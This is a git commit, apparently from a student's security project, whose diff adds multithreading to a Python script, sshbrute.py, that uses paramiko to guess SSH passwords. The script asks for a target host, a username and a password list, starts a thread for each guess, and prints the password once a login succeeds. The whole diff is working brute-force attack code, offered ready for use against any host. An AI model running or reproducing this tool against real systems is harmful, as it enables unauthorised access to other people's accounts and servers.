05877c61fc3e16c725f8f33bb2677b066559a79f
Andrei <zenin.an@do-student.ru>
2023-04-13 09:18:36 +0300

    added multithreading

--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -1,20 +1,24 @@
-import paramiko, sys, os, socket
+import paramiko, sys, os, socket, threading, time
 from termcolor import colored
-host = input(colored('[+] Target address: ', 'blue'))
-username = input(colored('[+] ssh username: ', 'blue'))
-input_file = input(colored('[+] passwords file: ', 'blue'))
 
-def ssh_connect(password, code = 0):
+stop_flag = 0
+
+
+
+def ssh_connect(password):
+    global stop_flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(host, port=22, username=username, password=password)
-    except paramiko.AuthenticationException:
-        code = 1
-    except socket.error as e:
-        code = 2
-    ssh.close()
-    return code
+        stop_flag = 1
+        print(colored(f'[+] found password: "{password}" for account "{username}"', 'green'))
+    except:
+       ssh.close()
+
+host = input(colored('[+] Target address: ', 'blue'))
+username = input(colored('[+] ssh username: ', 'blue'))
+input_file = input(colored('[+] passwords file: ', 'blue'))
 
 while os.path.exists(input_file) == False:
     print(colored('[!] that file doesnt exist', 'red'))
@@ -22,20 +26,14 @@ while os.path.exists(input_file) == False:
     if input_file == 'q':
         sys.exit(1)
     
+print(colored(f'---starting bruteforce on {host} with {username}---', 'yellow'))
 
 with open(input_file, 'r') as file:
     for line in file.readlines():
+        if stop_flag ==1:
+            t.join()
+            exit()
         password = line.strip()
-        try:
-            response = ssh_connect(password)
-            if response == 0:
-                print(colored(f'[+] found password: "{password}" for account "{username}"', 'green'))
-                break
-            elif response == 1:
-                pass
-            elif response == 2:
-                print(colored('[!] Cant connerc', 'red'))
-                sys.exit(1)
-        except Exception as e:
-            print(e)
-            pass
+        t = threading.Thread(target=ssh_connect, args=(password,))
+        t.start()
+        time.sleep(0.4)
